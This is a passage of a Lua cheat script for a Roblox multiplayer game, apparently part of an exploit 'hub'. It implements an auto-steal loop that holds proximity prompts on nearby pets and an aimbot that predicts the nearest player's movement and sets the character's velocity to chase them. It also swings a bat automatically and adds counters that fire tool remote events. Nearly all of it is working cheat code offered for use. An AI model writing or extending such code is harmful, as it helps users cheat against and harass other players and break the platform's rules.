    M.V3.conn = RunService.Heartbeat:Connect(function(dt)
        if not M.Steal.AutoStealEnabled or M.stealMode ~= "V3" or not M.V3.enabled then
            if M.V3.holdPrompt then v3ReleasePrompt(M.V3.holdPrompt) end
            if M.V3.progress > 0 or M.V3.holding or M.isStealing then
                M.V3.progress = 0
                M.V3.currentUid = nil
                M.V3.holding = false
                M.V3.holdPrompt = nil
                M.isStealing = false
                M.updateStealProgress(0)
            end
            return
        end

        local stopT = math.max(tonumber(M.Steal.StopTime) or 0.35, 0.05)
        local holdT = math.max(tonumber(M.Steal.StealDuration) or 1.4, 0.05)

        if tick() < (M.V3.cooldownUntil or 0) then
            M.updateStealProgress(0)
            return
        end

        local char = player.Character
        local hrp = char and (char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("UpperTorso"))
        if not hrp then return end

        local target = nearestAnimalNormal()
        local dist = target and v3LiveDist(target, hrp) or math.huge
        local radius = M.getActiveStealRadius()
        local inRange = target ~= nil and dist <= radius

        if inRange then
            M.V3.lastInRange = tick()

            if M.V3.currentUid ~= target.uid then
                -- switched pet: release old hold, keep some progress only if same fill preferred restart
                if M.V3.holdPrompt then v3ReleasePrompt(M.V3.holdPrompt) end
                M.V3.currentUid = target.uid
                M.V3.progress = 0
                M.V3.holding = false
                M.V3.holdPrompt = nil
            end

            local prompt = M.promptCache[target.uid]
            if not prompt or not prompt.Parent then
                prompt = findPromptNormal(target)
            end
            if not prompt then
                -- still show proximity progress so bar matches video feel
                M.V3.progress = math.clamp(M.V3.progress + (dt / holdT), 0, 1)
                M.updateStealProgress(M.V3.progress)
                M.isStealing = M.V3.progress > 0
                return
            end

            -- Keep hold alive: pulse InputHoldBegin ~10x/sec while in range
            M.V3.holdPrompt = prompt
            M.isStealing = true
            local now = tick()
            if (not M.V3.holding) or (now - (M.V3.lastHoldPulse or 0) > 0.1) then
                M.V3.holding = true
                M.V3.lastHoldPulse = now
                v3HoldPrompt(prompt)
            end

            M.V3.progress = math.clamp(M.V3.progress + (dt / holdT), 0, 1)
            M.updateStealProgress(M.V3.progress)

            if M.V3.progress >= 1 then
                v3TriggerPrompt(prompt)
                M.V3.progress = 0
                M.V3.currentUid = nil
                M.V3.holding = false
                M.V3.holdPrompt = nil
                M.isStealing = false
                M.updateStealProgress(0)
                M.V3.cooldownUntil = tick() + math.max(stopT, 0.25)
            end
        else
            -- Out of range: release hold, decay progress over Stop Time (video-style drop)
            if M.V3.holding or M.V3.holdPrompt then
                v3ReleasePrompt(M.V3.holdPrompt)
                M.V3.holding = false
                M.V3.holdPrompt = nil
            end

            if M.V3.progress > 0 then
                local decay = dt / stopT
                M.V3.progress = math.max(0, M.V3.progress - decay)
                M.updateStealProgress(M.V3.progress)
                if M.V3.progress <= 0 then
                    M.V3.currentUid = nil
                    M.isStealing = false
                    M.updateStealProgress(0)
                else
                    M.isStealing = true
                end
            else
                M.isStealing = false
            end
        end
    end)
end

function M.stopV3Steal()
    M.V3.enabled = false
    if M.V3.holdPrompt then
        v3ReleasePrompt(M.V3.holdPrompt)
    end
    if M.V3.conn then
        pcall(function() M.V3.conn:Disconnect() end)
        M.V3.conn = nil
    end
    M.V3.progress = 0
    M.V3.currentUid = nil
    M.V3.holding = false
    M.V3.holdPrompt = nil
    M.V3.cooldownUntil = 0
    M.V3.lastInRange = 0
    M.V3.lastHoldPulse = 0
    M.isStealing = false
    M.updateStealProgress(0)
end

function M.startAutoSteal()
    if M.statusGui then M.statusGui.Enabled = true end
    local mode = M.stealMode
    if mode == "Semi" or mode == "V2" then
        M.startSemiSteal()
    elseif mode == "V3" then
        M.startV3Steal()
    else
        -- Normal / V1
        M.startNormalSteal()
    end
end

function M.stopAutoSteal()
    if M.statusGui then M.statusGui.Enabled = true end
    M.stopNormalSteal()
    M.stopSemiSteal()
    M.stopV3Steal()
    M.isStealing = false
    M.updateStealProgress(0)
end

function M.setStealRadius(radius)
    M.Steal.StealRadius = radius
    M.updateStatusRadius()
end

-- ============================================================
-- OTHER CORE FUNCTIONS (unchanged - abbreviate per spazio)
-- ============================================================
function M.findBat()
    local char=player.Character;if not char then return nil end
    for _,tool in ipairs(char:GetChildren()) do if tool:IsA("Tool") and (tool.Name:lower():find("bat") or tool.Name:lower():find("slap")) then return tool end end
    local bp=player:FindFirstChild("Backpack");if bp then for _,tool in ipairs(bp:GetChildren()) do if tool:IsA("Tool") and (tool.Name:lower():find("bat") or tool.Name:lower():find("slap")) then return tool end end end
    return nil
end

function M.findMedusa()
    local c=player.Character;if not c then return nil end
    for _,t in ipairs(c:GetChildren()) do if t:IsA("Tool") then local n=t.Name:lower();if n:find("medusa") or n:find("head") or n:find("stone") then return t end end end
    local bp=player:FindFirstChild("Backpack");if bp then for _,t in ipairs(bp:GetChildren()) do if t:IsA("Tool") then local n=t.Name:lower();if n:find("medusa") or n:find("head") or n:find("stone") then return t end end end end
    return nil
end

function M.useMedusaCounter()
    if M.medusaDebounce then return end;if M.MEDUSA_COOLDOWN>(tick()-M.medusaLastUsed) then return end
    local c=player.Character;if not c then return end;M.medusaDebounce=true
    local med=M.findMedusa();if not med then M.medusaDebounce=false;return end
    if med.Parent~=c then local hum2=c:FindFirstChildOfClass("Humanoid");if hum2 then hum2:EquipTool(med) end end
    pcall(function() med:Activate() end);M.medusaLastUsed=tick();M.medusaDebounce=false
end

function M.onAnchorChanged(part)
    return part:GetPropertyChangedSignal("Anchored"):Connect(function()
        if part.Anchored and part.Transparency==1 then
            if M.medusaResetEnabled then M.instaReset()
            elseif M.medusaCounterEnabled then M.useMedusaCounter() end
        end
    end)
end

function M.setupMedusa(char)
    for _,c in pairs(M.Conns.anchor) do pcall(function() c:Disconnect() end) end;M.Conns.anchor={}
    if not char then return end
    for _,part in ipairs(char:GetDescendants()) do if part:IsA("BasePart") then table.insert(M.Conns.anchor,M.onAnchorChanged(part)) end end
    table.insert(M.Conns.anchor,char.DescendantAdded:Connect(function(part) if part:IsA("BasePart") then table.insert(M.Conns.anchor,M.onAnchorChanged(part)) end end))
end

function M.stopMedusaCounter() for _,c in pairs(M.Conns.anchor) do pcall(function() c:Disconnect() end) end;M.Conns.anchor={} end

function M.findBatForCounter()
    local c=player.Character;if not c then return nil end;local bp=player:FindFirstChildOfClass("Backpack")
    for _,name in ipairs(M.BAT_COUNTER_SLAP_LIST) do local t=c:FindFirstChild(name) or (bp and bp:FindFirstChild(name));if t then return t end end
    for _,ch in ipairs(c:GetChildren()) do if ch:IsA("Tool") and ch.Name:lower():find("bat") then return ch end end
    if bp then for _,ch in ipairs(bp:GetChildren()) do if ch:IsA("Tool") and ch.Name:lower():find("bat") then return ch end end end
    return nil
end

function M.swingBatForCounter(bat,char)
    local hum2=char:FindFirstChildOfClass("Humanoid")
    if bat.Parent~=char then if hum2 then pcall(function() hum2:EquipTool(bat) end) end;task.wait(0.05) end
    local remote=bat:FindFirstChildOfClass("RemoteEvent") or bat:FindFirstChildOfClass("RemoteFunction")
    if remote and remote:IsA("RemoteEvent") then pcall(function() remote:FireServer() end);task.wait(0.15);pcall(function() remote:FireServer() end)
    else pcall(function() bat:Activate() end);task.wait(0.15);pcall(function() bat:Activate() end) end
end

function M.startBatCounter()
    if M.Conns.batCounter then return end
    M.Conns.batCounter=RunService.Heartbeat:Connect(function()
        if not M.batCounterEnabled or M.batCounterDebounce then return end
        local char=player.Character;if not char then return end;local hum2=char:FindFirstChildOfClass("Humanoid");if not hum2 then return end
        local st=hum2:GetState()
        if st==Enum.HumanoidStateType.Physics or st==Enum.HumanoidStateType.Ragdoll or st==Enum.HumanoidStateType.FallingDown then
            M.batCounterDebounce=true;task.spawn(function() local bat=M.findBatForCounter();if bat then M.swingBatForCounter(bat,char) end;task.wait(0.5);M.batCounterDebounce=false end)
        end
    end)
end

function M.stopBatCounter() if M.Conns.batCounter then M.Conns.batCounter:Disconnect();M.Conns.batCounter=nil end;M.batCounterDebounce=false end

-- ============================================================
-- NORMAL AIMBOT (Asker Hub logic)
-- ============================================================
M.aimbotSpeed = M.aimbotSpeed or 58
M.laggerAimbotSpeed = M.laggerAimbotSpeed or 40
M._aimbotSwingCooldown = false
M.aimbotActivateDistance = M.aimbotActivateDistance or 10

function M.findBatForAimbot()
    local char = player.Character
    if not char then return nil end
    for _, tool in ipairs(char:GetChildren()) do
        if tool:IsA("Tool") and (tool.Name:lower():find("bat") or tool.Name:lower():find("slap")) then
            return tool
        end
    end
    local bp = player:FindFirstChild("Backpack")
    if bp then
        for _, tool in ipairs(bp:GetChildren()) do
            if tool:IsA("Tool") and (tool.Name:lower():find("bat") or tool.Name:lower():find("slap")) then
                return tool
            end
        end
    end
    return nil
end

function M.getClosestTargetAimbot()
    local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
    if not root then return nil end
    local closest, minDist = nil, math.huge
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= player and plr.Character then
            local tRoot = plr.Character:FindFirstChild("HumanoidRootPart")
            local hum = plr.Character:FindFirstChildOfClass("Humanoid")
            if tRoot and hum and hum.Health > 0 then
                local dist = (tRoot.Position - root.Position).Magnitude
                if dist < minDist then
                    minDist = dist
                    closest = tRoot
                end
            end
        end
    end
    return closest
end

function M.getNormalAimbotSpeed()
    if M.laggerModeEnabled or M.laggerCarryActive then
        return tonumber(M.laggerAimbotSpeed) or 40
    end
    return tonumber(M.aimbotSpeed) or 58
end

function M.startBatAimbot()
    if not M.safeModeTryStart() then return end
    if M.aimbotConn then M.aimbotConn:Disconnect() end
    M.autoBatEnabled = true
    if M.autoLeftEnabled then
        M.autoLeftEnabled = false
        if M.autoLeftSetVisual then M.autoLeftSetVisual(false) end
        M.stopAutoLeft()
    end
    if M.autoRightEnabled then
        M.autoRightEnabled = false
        if M.autoRightSetVisual then M.autoRightSetVisual(false) end
        M.stopAutoRight()
    end

    M._autoTPWasEnabledForBat = false
    if M.autoTPEnabled then
        M._autoTPWasEnabledForBat = true
        M.stopAutoTP()
        if M.setAutoTPVisual then M.setAutoTPVisual(false) end
    end

    local char = player.Character
    if not char then return end
    local humanoid = char:FindFirstChildOfClass("Humanoid")
    local rootPart = char:FindFirstChild("HumanoidRootPart")
    if not humanoid or not rootPart then return end
    humanoid.AutoRotate = false
    local MIN_FOLLOW_DISTANCE=1; local PREDICTION_TIME=0.22
    local PREDICT_AHEAD=3; local JUMP_SPEED_BOOST=1.5; local JUMP_THRESHOLD=8
    local ACTIVATION_DELAY=0.2; local AIRBORNE_THRESHOLD=0.15; local FLOAT_Y_THRESHOLD=3; local FALLING_THRESHOLD=-8
    local RISING_THRESHOLD=8; local VERTICAL_OFFSET_MULTIPLIER=0.15; local JUMPBOOST_Y_THRESHOLD=35
    local EXTREME_JUMPBOOST_THRESHOLD=50; local JUMPBOOST_SUSTAINED_TIME=0.15; local MAX_VELOCITY_CHANGE=150
    local VELOCITY_SMOOTHING=0.2; local MAX_HORIZONTAL_VELOCITY=80; local ERRATIC_MOVEMENT_THRESHOLD=3
    local SERVER_TICKRATE=1/60; local PING_SAMPLE_SIZE=10; local MIN_PING_COMPENSATION=0.03; local MAX_PING_COMPENSATION=0.25
    local ACCELERATION_PREDICTION_WEIGHT=0.3; local DIRECTION_CHANGE_DETECTION_TIME=0.12; local QUICK_DIRECTION_CHANGE_MULTIPLIER=1.5
    local GRAVITY=196.2; local AIR_CONTROL_FACTOR=0.8; local AERIAL_VELOCITY_DECAY=0.95; local AERIAL_DIRECTION_CHANGE_WEIGHT=0.6
    local MIN_AIRBORNE_TIME=0.08; local AERIAL_SMOOTHING=0.15; local PEAK_JUMP_THRESHOLD=3; local AERIAL_PREDICTION_BOOST=1.2
    local STRAFE_DETECTION_THRESHOLD=0.7; local HIGH_JUMP_THRESHOLD=20; local FALLING_SPEED_THRESHOLD=-15
    local GRAVITY_PREDICTION_WEIGHT=1.0; local MULTI_JUMP_DETECTION_WINDOW=0.2; local UPWARD_VELOCITY_RESET_THRESHOLD=10
    local VERTICAL_POSITION_LEAD=2.5; local FALLING_VERTICAL_LEAD=3.5
    local predictionSphere=nil; local targetPlayer=nil; local lastTargetPos=nil; local targetVelocity=Vector3.new(0,0,0)
    local smoothedVelocity=Vector3.new(0,0,0); local velocityHistory={}; local MAX_HISTORY=8; local airborneTime=0
    local lastActivationTime=0; local highYVelocityTime=0; local pingHistory={}; local currentPing=0.1
    local lastAcceleration=Vector3.new(0,0,0); local accelerationHistory={}; local MAX_ACCEL_HISTORY=4
    local lastDirectionChangeTime=0; local previousDirection=nil; local wasAirborne=false
    local aerialVelocityHistory={}; local MAX_AERIAL_HISTORY=6; local aerialSmoothVelocity=Vector3.new(0,0,0)
    local lastGroundedPosition=nil; local lastYVelocity=0; local peakHeight=0; local groundHeight=0
    local lastJumpTime=0; local isMultiJumping=false; local verticalVelocityHistory={}; local MAX_VERTICAL_HISTORY=5
    local realPingMs=0
    local function getNearestPlayer()
        local char=player.Character; if not char then return nil end
        local root=char:FindFirstChild("HumanoidRootPart"); if not root then return nil end
        local myPos=root.Position; local nearestDist=math.huge; local nearestPlayer=nil
        for _,p in ipairs(Players:GetPlayers()) do
            if p~=player and p.Character then
                local otherRoot=p.Character:FindFirstChild("HumanoidRootPart")
                if otherRoot then local dist=(myPos-otherRoot.Position).Magnitude; if dist<nearestDist then nearestDist=dist; nearestPlayer=p end end
            end
        end
        return nearestPlayer
    end
    local function getAverageVelocity() if #velocityHistory==0 then return Vector3.new(0,0,0) end; local sum=Vector3.new(0,0,0); for _,vel in ipairs(velocityHistory) do sum=sum+vel end; return sum/#velocityHistory end
    local function getAverageAcceleration() if #accelerationHistory==0 then return Vector3.new(0,0,0) end; local sum=Vector3.new(0,0,0); for _,a in ipairs(accelerationHistory) do sum=sum+a end; return sum/#accelerationHistory end
    local function getAverageAerialVelocity() if #aerialVelocityHistory==0 then return Vector3.new(0,0,0) end; local sum=Vector3.new(0,0,0); for _,vel in ipairs(aerialVelocityHistory) do sum=sum+Vector3.new(vel.X,0,vel.Z) end; return sum/#aerialVelocityHistory end
    local function getAverageVerticalVelocity() if #verticalVelocityHistory==0 then return 0 end; local sum=0; for _,y in ipairs(verticalVelocityHistory) do sum=sum+y end; return sum/#verticalVelocityHistory end
    local function detectMultiJump(currentYVel,wasRising) local t=tick(); if lastYVelocity<-5 and currentYVel>UPWARD_VELOCITY_RESET_THRESHOLD then if t-lastJumpTime<MULTI_JUMP_DETECTION_WINDOW then return true end; lastJumpTime=t; return true end; return false end
    local function isFallingFromHeight(currentPos,yVel) return (currentPos.Y-groundHeight>HIGH_JUMP_THRESHOLD) and yVel<FALLING_SPEED_THRESHOLD end
    local function isAerialStrafing() if #aerialVelocityHistory<3 then return false end; local dc=0; for i=2,#aerialVelocityHistory do local v1=Vector3.new(aerialVelocityHistory[i-1].X,0,aerialVelocityHistory[i-1].Z); local v2=Vector3.new(aerialVelocityHistory[i].X,0,aerialVelocityHistory[i].Z); if v1.Magnitude>3 and v2.Magnitude>3 then if v1.Unit:Dot(v2.Unit)<STRAFE_DETECTION_THRESHOLD then dc=dc+1 end end end; return dc>=2 end
    local function detectDirectionChange(currentVel) local horizontal=Vector3.new(currentVel.X,0,currentVel.Z); if horizontal.Magnitude<5 then return false end; if previousDirection then local dot=previousDirection:Dot(horizontal.Unit); if dot<0.5 then local t=tick(); if t-lastDirectionChangeTime<DIRECTION_CHANGE_DETECTION_TIME then previousDirection=horizontal.Unit; lastDirectionChangeTime=t; return true end; lastDirectionChangeTime=t end end; previousDirection=horizontal.Unit; return false end
    local function isErraticMovement() if #velocityHistory<3 then return false end; local changes=0; for i=2,#velocityHistory do local v1=Vector3.new(velocityHistory[i-1].X,0,velocityHistory[i-1].Z); local v2=Vector3.new(velocityHistory[i].X,0,velocityHistory[i].Z); if v1.Magnitude>5 and v2.Magnitude>5 then if v1.Unit:Dot(v2.Unit)<0.3 then changes=changes+1 end end end; return changes>=ERRATIC_MOVEMENT_THRESHOLD end
    local function isInfiniteJumping() if #velocityHistory<3 then return false end; local yc=0; for i=2,#velocityHistory do if math.abs(velocityHistory[i].Y-velocityHistory[i-1].Y)>15 then yc=yc+1 end end; return yc>=2 end
    local function isJumpBoostCheat() return math.abs(targetVelocity.Y)>JUMPBOOST_Y_THRESHOLD and highYVelocityTime>JUMPBOOST_SUSTAINED_TIME end
    local function isExtremeJumpBoost() return math.abs(targetVelocity.Y)>EXTREME_JUMPBOOST_THRESHOLD end
    local function isFloating() return airborneTime>AIRBORNE_THRESHOLD and math.abs(targetVelocity.Y)>FLOAT_Y_THRESHOLD end
    local function checkAirborne(targetRoot) local params=RaycastParams.new(); params.FilterType=Enum.RaycastFilterType.Exclude; params.FilterDescendantsInstances={targetPlayer.Character,player.Character}; local rayResult=workspace:Raycast(targetRoot.Position,Vector3.new(0,-100,0),params); if rayResult then groundHeight=rayResult.Position.Y; return false end; return true end
    local function clampVelocityChange(newVel,oldVel,maxChange) local delta=newVel-oldVel; if delta.Magnitude>maxChange then return oldVel+(delta.Unit*maxChange) end; return newVel end
    local function smoothVelocity(current,target,alpha) return current:Lerp(target,alpha) end
    local function predictAerialPosition(currentPos,velocity,dt,isStrafing,isFastFalling,isMultiJump)
        local horizVel=Vector3.new(velocity.X,0,velocity.Z); local vertVel=velocity.Y
        if isStrafing then local avgAerial=getAverageAerialVelocity(); horizVel=Vector3.new(avgAerial.X,0,avgAerial.Z)*AIR_CONTROL_FACTOR
        else horizVel=horizVel*AIR_CONTROL_FACTOR end
        horizVel=horizVel*AERIAL_VELOCITY_DECAY
        local gravityEffect=GRAVITY*GRAVITY_PREDICTION_WEIGHT
        if isMultiJump then gravityEffect=gravityEffect*0.3; vertVel=vertVel*0.9 end
        local verticalDisplacement
        if isFastFalling then verticalDisplacement=(vertVel*dt)-(0.5*gravityEffect*1.2*dt*dt)-(FALLING_VERTICAL_LEAD*dt)
        else verticalDisplacement=(vertVel*dt)-(0.5*gravityEffect*dt*dt) end
        if vertVel>RISING_THRESHOLD and not isMultiJump then verticalDisplacement=verticalDisplacement+(VERTICAL_POSITION_LEAD*dt) end
        return currentPos+horizVel*dt+Vector3.new(0,verticalDisplacement,0)
    end
    local function predictServerPosition(currentPos,velocity,acceleration,ping,isQuickTurn,isAerial,isStrafing,isFastFalling,isMultiJump)
        local serverDelay=ping+SERVER_TICKRATE
        if isQuickTurn then serverDelay=serverDelay*QUICK_DIRECTION_CHANGE_MULTIPLIER end
        if isAerial then return predictAerialPosition(currentPos,velocity,serverDelay,isStrafing,isFastFalling,isMultiJump) end
        local predictedPos=currentPos+velocity*serverDelay
        if acceleration.Magnitude>1 then predictedPos=predictedPos+(acceleration*ACCELERATION_PREDICTION_WEIGHT)*(serverDelay*serverDelay*0.5) end
        return predictedPos
    end
    local SPHERE_SMOOTH_SPEED=15
    local function createPredictionSphere()
        if predictionSphere then predictionSphere:Destroy() end
        predictionSphere=Instance.new("Part"); predictionSphere.Name="PredictionSphere"; predictionSphere.Shape=Enum.PartType.Ball
        predictionSphere.Size=Vector3.new(2,2,2); predictionSphere.Anchored=true; predictionSphere.CanCollide=false
        predictionSphere.Material=Enum.Material.Neon; predictionSphere.Color=Color3.fromRGB(200,200,200); predictionSphere.Transparency=1
        local light=Instance.new("PointLight"); light.Color=Color3.fromRGB(200,200,200); light.Range=8; light.Brightness=2; light.Parent=predictionSphere
        local outline=Instance.new("Highlight"); outline.FillTransparency=1; outline.OutlineColor=Color3.fromRGB(180,180,180); outline.OutlineTransparency=1; outline.Parent=predictionSphere
        predictionSphere.Parent=workspace; return predictionSphere
    end
    local function updatePredictionSphere(targetPosition,dt)
        if not predictionSphere then return end; local alpha=math.min(1,dt*SPHERE_SMOOTH_SPEED); predictionSphere.CFrame=predictionSphere.CFrame:Lerp(CFrame.new(targetPosition),alpha)
    end
    local function updateRotationAngular(lookDirection,rootPart)
        if not rootPart then return end; if lookDirection.Magnitude<0.01 then return end
        local currentLook=rootPart.CFrame.LookVector; local targetDir=lookDirection.Unit; local axis=currentLook:Cross(targetDir)
        local angle=math.asin(math.clamp(axis.Magnitude,-1,1))
        if axis.Magnitude>0.01 then local rotSpeed=80; rootPart.AssemblyAngularVelocity=axis.Unit*angle*rotSpeed
        else rootPart.AssemblyAngularVelocity=Vector3.zero end
    end
    local function startFollowing(char)
        local humanoid=char:FindFirstChildOfClass("Humanoid"); local rootPart=char:FindFirstChild("HumanoidRootPart")
        if not humanoid or not rootPart then return end; humanoid.AutoRotate=false
        if not predictionSphere then createPredictionSphere() end
        if M.aimbotConn then M.aimbotConn:Disconnect() end
        M.aimbotConn=RunService.RenderStepped:Connect(function(dt)
            if not M.autoBatEnabled then if M.aimbotConn then M.aimbotConn:Disconnect(); M.aimbotConn=nil end; return end
            targetPlayer=getNearestPlayer()
            if not targetPlayer or not targetPlayer.Character then
                if predictionSphere then predictionSphere.Transparency=1 end
                targetPlayer=nil; lastTargetPos=nil; targetVelocity=Vector3.zero; smoothedVelocity=Vector3.zero
                velocityHistory={}; accelerationHistory={}; aerialVelocityHistory={}; verticalVelocityHistory={}
                aerialSmoothVelocity=Vector3.zero; airborneTime=0; highYVelocityTime=0
                previousDirection=nil; wasAirborne=false; lastYVelocity=0; peakHeight=0; isMultiJumping=false; return
            end
            local targetRoot=targetPlayer.Character:FindFirstChild("HumanoidRootPart"); if not targetRoot then if predictionSphere then predictionSphere.Transparency=1 end; return end
            if predictionSphere then predictionSphere.Transparency=1 end
            local targetPos=targetRoot.Position; local myPos=rootPart.Position
            if lastTargetPos then
                local deltaPos=targetPos-lastTargetPos; local rawVelocity=deltaPos/dt
                rawVelocity=clampVelocityChange(rawVelocity,targetVelocity,MAX_VELOCITY_CHANGE)
                local horizontalVel=Vector3.new(rawVelocity.X,0,rawVelocity.Z)
                if horizontalVel.Magnitude>MAX_HORIZONTAL_VELOCITY then horizontalVel=horizontalVel.Unit*MAX_HORIZONTAL_VELOCITY; rawVelocity=Vector3.new(horizontalVel.X,rawVelocity.Y,horizontalVel.Z) end
                local currentAcceleration=(rawVelocity-targetVelocity)/dt
                table.insert(accelerationHistory,currentAcceleration); if #accelerationHistory>MAX_ACCEL_HISTORY then table.remove(accelerationHistory,1) end
                table.insert(verticalVelocityHistory,rawVelocity.Y); if #verticalVelocityHistory>MAX_VERTICAL_HISTORY then table.remove(verticalVelocityHistory,1) end
                targetVelocity=rawVelocity; smoothedVelocity=smoothVelocity(smoothedVelocity,targetVelocity,VELOCITY_SMOOTHING)
                table.insert(velocityHistory,targetVelocity); if #velocityHistory>MAX_HISTORY then table.remove(velocityHistory,1) end
            end
            lastTargetPos=targetPos
            if math.abs(targetVelocity.Y)>JUMPBOOST_Y_THRESHOLD then highYVelocityTime=highYVelocityTime+dt else highYVelocityTime=0 end
            local isAirborne=checkAirborne(targetRoot)
            if isAirborne then
                airborneTime=airborneTime+dt; if targetPos.Y>peakHeight then peakHeight=targetPos.Y end
                if airborneTime>=MIN_AIRBORNE_TIME then
                    table.insert(aerialVelocityHistory,targetVelocity); if #aerialVelocityHistory>MAX_AERIAL_HISTORY then table.remove(aerialVelocityHistory,1) end
                    aerialSmoothVelocity=smoothVelocity(aerialSmoothVelocity,targetVelocity,AERIAL_SMOOTHING)
                end
                wasAirborne=true
            else airborneTime=0; wasAirborne=false; aerialVelocityHistory={}; aerialSmoothVelocity=Vector3.zero; lastGroundedPosition=targetPos; peakHeight=0 end
            local isJumping=math.abs(targetVelocity.Y)>JUMP_THRESHOLD; local isInfJump=isInfiniteJumping(); local isFloater=isFloating()
            local isJumpBoost=isJumpBoostCheat(); local isExtremeBoost=isExtremeJumpBoost(); local isErratic=isErraticMovement()
            local avgVelocity=getAverageVelocity(); local avgAcceleration=getAverageAcceleration()
            local isQuickTurn=detectDirectionChange(targetVelocity); local isStrafing=isAerialStrafing()
            local isTrulyAirborne=isAirborne and airborneTime>=MIN_AIRBORNE_TIME
            local wasRising=lastYVelocity>RISING_THRESHOLD; isMultiJumping=detectMultiJump(targetVelocity.Y,wasRising)
            local isFastFalling=isFallingFromHeight(targetPos,targetVelocity.Y); local avgYVel=getAverageVerticalVelocity()
            lastYVelocity=targetVelocity.Y
            local predictionVel=targetVelocity; local predictionAccel=avgAcceleration; local useCurrentPos=false
            if isExtremeBoost then useCurrentPos=true; predictionVel=Vector3.new(avgVelocity.X,0,avgVelocity.Z); predictionAccel=Vector3.zero
            elseif isJumpBoost then local avgH=Vector3.new(avgVelocity.X,0,avgVelocity.Z); predictionVel=Vector3.new(avgH.X,targetVelocity.Y*0.15,avgH.Z); predictionAccel=Vector3.new(avgAcceleration.X,0,avgAcceleration.Z)
            elseif isInfJump or isFloater then local avgH=Vector3.new(avgVelocity.X,0,avgVelocity.Z); predictionVel=Vector3.new(avgH.X,targetVelocity.Y*0.5,avgH.Z); predictionAccel=Vector3.new(avgAcceleration.X*0.5,0,avgAcceleration.Z*0.5)
            elseif isTrulyAirborne and isStrafing then local avgAerial=getAverageAerialVelocity(); predictionVel=Vector3.new(aerialSmoothVelocity.X*AERIAL_DIRECTION_CHANGE_WEIGHT+avgAerial.X*(1-AERIAL_DIRECTION_CHANGE_WEIGHT),avgYVel,aerialSmoothVelocity.Z*AERIAL_DIRECTION_CHANGE_WEIGHT+avgAerial.Z*(1-AERIAL_DIRECTION_CHANGE_WEIGHT)); predictionAccel=Vector3.new(avgAcceleration.X*0.3,0,avgAcceleration.Z*0.3)
            elseif isTrulyAirborne then predictionVel=Vector3.new(aerialSmoothVelocity.X,avgYVel,aerialSmoothVelocity.Z); predictionAccel=Vector3.zero
            elseif isErratic then predictionVel=Vector3.new(smoothedVelocity.X,targetVelocity.Y,smoothedVelocity.Z); predictionAccel=Vector3.new(avgAcceleration.X*0.7,0,avgAcceleration.Z*0.7) end
            local serverPredictedPos; if useCurrentPos then serverPredictedPos=targetPos else serverPredictedPos=predictServerPosition(targetPos,predictionVel,predictionAccel,currentPing,isQuickTurn,isTrulyAirborne,isStrafing,isFastFalling,isMultiJumping) end
            local predTime=PREDICTION_TIME*1.1
            if isErratic then predTime=predTime*0.6 elseif isQuickTurn then predTime=predTime*1.2 elseif isTrulyAirborne and isStrafing then predTime=predTime*0.7 elseif isTrulyAirborne and isFastFalling then predTime=predTime*1.3 elseif isTrulyAirborne then predTime=predTime*0.85 end
            local predictedPos; if isTrulyAirborne then predictedPos=predictAerialPosition(serverPredictedPos,predictionVel,predTime,isStrafing,isFastFalling,isMultiJumping) else predictedPos=serverPredictedPos+predictionVel*predTime end
            local verticalOffset=Vector3.new(0,0,0)
            if not isTrulyAirborne and not isExtremeBoost and not isJumpBoost and not isInfJump then
                if targetVelocity.Y<FALLING_THRESHOLD then verticalOffset=Vector3.new(0,targetVelocity.Y*VERTICAL_OFFSET_MULTIPLIER,0)
                elseif targetVelocity.Y>RISING_THRESHOLD then verticalOffset=Vector3.new(0,targetVelocity.Y*VERTICAL_OFFSET_MULTIPLIER,0) end
            end
            predictedPos=predictedPos+verticalOffset
            local interceptOffset=Vector3.new(0,0,0); local horizontalVel=Vector3.new(predictionVel.X,0,predictionVel.Z)
            if horizontalVel.Magnitude>1 and not useCurrentPos then interceptOffset=horizontalVel.Unit*PREDICT_AHEAD end
            local interceptPoint=predictedPos+interceptOffset; updatePredictionSphere(interceptPoint,dt)
            local toTarget=interceptPoint-myPos; if toTarget.Magnitude>0.1 then updateRotationAngular(toTarget,rootPart) end
            local actualDistance=(targetPos-myPos).Magnitude
            if actualDistance<=M.aimbotActivateDistance then
                local currentTime=tick()
                if currentTime-lastActivationTime>=0.3 then
                    if useCurrentPos or (isErratic and not isTrulyAirborne) then interceptPoint=serverPredictedPos
                    elseif isTrulyAirborne then interceptPoint=predictAerialPosition(serverPredictedPos,predictionVel,ACTIVATION_DELAY,isStrafing,isFastFalling,isMultiJumping)
                    else interceptPoint=serverPredictedPos+predictionVel*ACTIVATION_DELAY end
                    local bat = M.findBatForAimbot()
                    local currentTool = nil
                    for _, child in ipairs(char:GetChildren()) do
                        if child:IsA("Tool") then currentTool = child; break end
                    end
                    if bat and not currentTool then
                        pcall(function() humanoid:EquipTool(bat) end)
                    end
                    local tool=char:FindFirstChildOfClass("Tool"); if tool then tool:Activate() end; lastActivationTime=currentTime
                end
            end
            local direction=interceptPoint-myPos
            if direction.Magnitude>MIN_FOLLOW_DISTANCE then
                local dirUnit=direction.Unit; local currentSpeed=M.aimbotSpeed
                if isJumping then currentSpeed=currentSpeed*JUMP_SPEED_BOOST end
                if isExtremeBoost then currentSpeed=currentSpeed*1.3 elseif isJumpBoost or isInfJump or isFloater then currentSpeed=currentSpeed*1.15 end
                if isErratic then currentSpeed=currentSpeed*0.9 elseif isQuickTurn then currentSpeed=currentSpeed*1.1 elseif isTrulyAirborne and isStrafing then currentSpeed=currentSpeed*0.95 elseif isTrulyAirborne and isFastFalling then currentSpeed=currentSpeed*1.15 elseif isTrulyAirborne then currentSpeed=currentSpeed*1.05 end
                -- Keep V1 at 58 in Normal mode and 42 in Lagger mode.
                currentSpeed=M.getNormalAimbotSpeed(); rootPart.AssemblyLinearVelocity=dirUnit*currentSpeed
            else rootPart.AssemblyLinearVelocity=Vector3.new(0,rootPart.AssemblyLinearVelocity.Y*0.5,0) end
        end)
    end
    local function stopCircleInternal()
        if M.aimbotConn then M.aimbotConn:Disconnect(); M.aimbotConn=nil end
        if predictionSphere then predictionSphere:Destroy(); predictionSphere=nil end
        local char=player.Character
        if char then local hum=char:FindFirstChildOfClass("Humanoid"); if hum then hum.AutoRotate=true end; local root=char:FindFirstChild("HumanoidRootPart"); if root then root.AssemblyAngularVelocity=Vector3.zero end end
        targetPlayer=nil; lastTargetPos=nil; targetVelocity=Vector3.zero; smoothedVelocity=Vector3.zero
